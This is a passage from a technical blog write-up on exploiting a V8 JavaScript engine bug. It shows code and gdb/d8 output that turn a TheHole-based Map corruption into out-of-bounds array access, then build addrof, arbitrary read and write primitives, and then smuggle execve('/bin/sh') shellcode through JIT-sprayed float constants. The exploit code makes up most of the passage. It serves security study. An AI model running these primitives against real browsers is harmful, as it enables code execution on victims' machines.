<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8&gt; m.set(oob_arr, 0xffff);
</span></span><span class="line"><span class="cl">d8&gt; oob_arr.length
</span></span><span class="line"><span class="cl">65535
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... # Back to gdb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; x/30wx 0x1d9d0028764d-1+0x4c
</span></span><span class="line"><span class="cl">0x1d9d00287698:	0x0018e6bd	0x0016a2e8	0x00287699	0x0001fffe
</span></span><span class="line"><span class="cl">0x1d9d002876a8:	0x000023e1	0x0019a879	0x00002ac1	0x00000004
</span></span><span class="line"><span class="cl">0x1d9d002876b8:	0x9999999a	0x3ff19999	0x9999999a	0x40019999
</span></span><span class="line"><span class="cl">0x1d9d002876c8:	0x000025d5	0x3ec011c6	0x00000004	0x29386428
</span></span><span class="line"><span class="cl">0x1d9d002876d8:	0x000025d5	0x8f31397e	0x00000014	0x62654425
</span></span><span class="line"><span class="cl">0x1d9d002876e8:	0x72506775	0x28746e69	0x5f626f6f	0x29727261
</span></span><span class="line"><span class="cl">0x1d9d002876f8:	0x00002231	0x00000004	0xe3e5e7e0	0x002876c9
</span></span><span class="line"><span class="cl">0x1d9d00287708:	0x00003039	0x00000004
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the oob_arr length is now <code>65535</code>, and the elements are pointing to itself (<code>0x00287699</code> is the lower 32-bit of <code>oob_arr</code> itself). For the last validation check, let&rsquo;s try to access some of the <code>oob_arr</code> elements</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8&gt; oob_arr[0]
</span></span><span class="line"><span class="cl">2.78129989631982e-309
</span></span><span class="line"><span class="cl">d8&gt; oob_arr[1]
</span></span><span class="line"><span class="cl">3.5681974603905814e-308
</span></span><span class="line"><span class="cl">d8&gt; oob_arr[2]
</span></span><span class="line"><span class="cl">8.4879885714e-314
</span></span><span class="line"><span class="cl">d8&gt; oob_arr[3]
</span></span><span class="line"><span class="cl">1.1
</span></span><span class="line"><span class="cl">d8&gt; oob_arr[4]
</span></span><span class="line"><span class="cl">2.2
</span></span></code></pre></td></tr></table>
</div>
</div><p>That&rsquo;s the correct behavior. Because we overwrote the <code>oob_arr</code> elements pointer to point to itself, the <code>oob_arr[0]</code> will return the value of <code>elements_ptr+0x8</code>, which is now equivalent to <code>oob_arr+0x8</code>.</p>
<p>Now that we can trigger OOB read-and-write, let&rsquo;s move to the next step</p>
<h3 id="preparing-primitives">Preparing primitives</h3>
<p>Now that we have an array that can do OOB read and write, to control the RIP, we need to be able to perform:</p>
<ul>
<li><code>addrof</code>: Get the address of an object.</li>
<li><code>read</code>  : Read the value of the given address.</li>
<li><code>write</code> : Write a value to the given address.</li>
</ul>
<h4 id="creating-helpers">Creating helpers</h4>
<p>To make our life easier, we need to define some helpers to easily convert from floating point to hex and vice-versa (Notice that everytime we access <code>oob_arr</code> elements, the returned value is in form of floating-point). Helpers are taken from Faraz&rsquo;s blog.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="creating-addrof">Creating addrof</h4>
<p>Let&rsquo;s start by creating the easiest method, which is <code>addrof</code>. The trick is simple (inspired from this <a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/" target="_blank" rel="noopener noreffer ">article</a>):</p>
<ul>
<li>Create a new variable called <code>victim</code>, which is an array of empty objects.</li>
<li>Assign the targeted object to one of the elements of the <code>victim</code>&rsquo;s array.
<ul>
<li>After this, now the assigned <code>victim</code>&rsquo;s element will store a pointer to the address of the targeted object (lower 32-bit only).</li>
</ul>
</li>
<li>Using OOB read from the <code>oob_arr</code>, read the <code>victim</code>&rsquo;s elements&rsquo; stored value (which is the targeted object address).</li>
</ul>
<p>Modify the <code>poc.js</code> to:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span> <span class="c1">// Helpers is put at the top of these LOCs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">oob_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">victim</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{},</span> <span class="p">{},</span> <span class="p">{}];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mask</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl">    <span class="nx">victim</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes:</p>
<ul>
<li>Remember that <code>v8</code> only store the lower 32-bit of the object address, while <code>oob_arr</code> value is a 64-bit floating point, so the <code>addrof</code> method will need to be masked so that it will return only the lower 32-bits.</li>
<li>Sometimes, the correct offset for the <code>oob_arr</code> is changing during development. You need to examine it in the <code>gdb</code> properly so that <code>oob_arr[chosen_offset]</code> will return the targeted object address stored inside the <code>victim[0]</code></li>
</ul>
<h4 id="creating-read">Creating Read</h4>
<p>After having <code>addrof</code> method, we need to be able to <code>read</code> the given address value. I decided to create a <code>read</code> method where:</p>
<ul>
<li>It can only read addresses relative to the stored <code>js_base</code>, so it can&rsquo;t read the value outside the js heap.</li>
<li>Send only the lower 32-bit of your targeted address (must be inside the js heap).</li>
<li>It will return a 64-bit floating point value of the resolved address&rsquo;s value.</li>
</ul>
<p>The trick that I used:</p>
<ul>
<li>Create an array called <code>read_gadget</code> which consists of floating-point values.</li>
<li>With OOB write from the <code>oob_arr</code>, overwrite the <code>read_gadget</code> elements pointer so that it points to <code>target_addr-0x8</code>. Why <code>-0x8</code>, because the first element of the array is stored in <code>elements+0x8</code>, so by setting the <code>elements</code> to point to <code>target_addr-0x8</code>, accessing <code>read_gadget[0]</code> will point to the <code>target_addr</code> value.</li>
<li>Return it</li>
</ul>
<p>Modify the <code>poc.js</code> to:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span> <span class="c1">// Helpers is put at the top of these LOCs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">oob_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">read_gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mask</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl">    <span class="nx">victim</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">37</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x600000000</span><span class="nx">n</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">read_gadget</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes:</p>
<ul>
<li>The correct offset of <code>oob_arr</code> which points to the properties of <code>read_gadget</code> <code>elements</code> might be changed during the development of our exploit. Always double-check it in <code>gdb</code></li>
<li>Because <code>oob_arr</code> is overwriting the whole 64-bit of the given address, we need to overwrite the <code>read_gadget</code> length as well, which is why I add the targeted address with <code>0x600000000</code> as the 32 upper-bit value.</li>
</ul>
<h4 id="creating-write">Creating Write</h4>
<p>Now that we have <code>read</code>, it&rsquo;s time to create the <code>write</code>. How to do it? Very simple. Same as <code>weak_read</code> method, but instead of returning the <code>read_gadget[0]</code> value, we assign the <code>read_gadget[0]</code> value with our desired value. Notes that the assignment&rsquo;s value will overwrite the whole 64-bit of the given address.</p>
<p>Modify the <code>poc.js</code> to:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span> <span class="c1">// Helpers is put at the top of these LOCs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">oob_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">read_gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mask</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl">    <span class="nx">victim</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">37</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x600000000</span><span class="nx">n</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">read_gadget</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">37</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x600000000</span><span class="nx">n</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">read_gadget</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="finding-a-way-to-control-the-rip">Finding a way to control the RIP</h3>
<p>Now that we have all the primitives that we need, we will move to our last step, which is controlling the RIP. After reading some articles, I find this <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" target="_blank" rel="noopener noreffer ">article</a> very helpful for me.</p>
<p>Reading through the article, we actually can smuggle shellcode via JIT Spraying attack. To smuggle it, what we can do is translate our shellcode to a floating-point number, so that our floating-point number hex is stored as it is in the Jitted function area.</p>
<p>For example, consider this code (taken from the article that I mentioned above).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">foo</span> <span class="o">=</span> <span class="p">()=&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="mf">1.0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.95538254221075331056310651818</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.95606125582421466942709801013</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.99957147195425773436923756715</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.95337673326740932133292175341</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">2.63486047652296056448306022844</span><span class="nx">E</span><span class="o">-</span><span class="mi">284</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">foo</span><span class="p">();</span><span class="nx">foo</span><span class="p">();</span><span class="nx">foo</span><span class="p">();</span><span class="nx">foo</span><span class="p">();}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The floating-point defined in the javascript is actually the smuggled shellcode which will do <code>sys_execve('/bin/sh')</code>. Because the function is called so many times, <code>v8</code> will JIT the code.</p>
<p>Let&rsquo;s try to examine what happen when the method <code>foo</code> got jitted by <code>v8</code> with the help of <code>%DebugPrint</code> and <code>job</code> after executing the above code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8&gt; %DebugPrint(foo)
</span></span><span class="line"><span class="cl">DebugPrint: 0x1d9d002ca78d: [Function] in OldSpace
</span></span><span class="line"><span class="cl"> - map: 0x1d9d00184241 &lt;Map[28](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span class="line"><span class="cl"> - prototype: 0x1d9d001840f5 &lt;JSFunction (sfi = 0x1d9d00145dfd)&gt;
</span></span><span class="line"><span class="cl"> - elements: 0x1d9d00002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span class="line"><span class="cl"> - function prototype: &lt;no-prototype-slot&gt;
</span></span><span class="line"><span class="cl"> - shared_info: 0x1d9d0019a025 &lt;SharedFunctionInfo foo&gt;
</span></span><span class="line"><span class="cl"> - name: 0x1d9d00199ea5 &lt;String[3]: #foo&gt;
</span></span><span class="line"><span class="cl"> - formal_parameter_count: 0
</span></span><span class="line"><span class="cl"> - kind: ArrowFunction
</span></span><span class="line"><span class="cl"> - context: 0x1d9d0019a2a1 &lt;ScriptContext[3]&gt;
</span></span><span class="line"><span class="cl"> - code: 0x1d9d0019a79d &lt;CodeDataContainer TURBOFAN&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> ... # Back to GDB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; x/20wx 0x1d9d002ca78d-1
</span></span><span class="line"><span class="cl">0x1d9d002ca78c:	0x00184241	0x00002259	0x00002259	0x0019a025
</span></span><span class="line"><span class="cl">0x1d9d002ca79c:	0x0019a2a1	0x0019a271	0x0019a79d	0x000025d5
</span></span><span class="line"><span class="cl">0x1d9d002ca7ac:	0x00000003	0x00000006	0x626f6c67	0x00006c61
</span></span><span class="line"><span class="cl">0x1d9d002ca7bc:	0x000025d5	0x00000003	0x00000006	0x6b726f57
</span></span><span class="line"><span class="cl">0x1d9d002ca7cc:	0x00007265	0x000025d5	0x00000003	0x00000005
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that there is a property called <code>code</code> inside the <code>foo</code> method, where based on examination in <code>gdb</code>, the offset is <code>code = foo+0x18</code>.</p>
<p>Let&rsquo;s examine the <code>code</code> property in <code>gdb</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
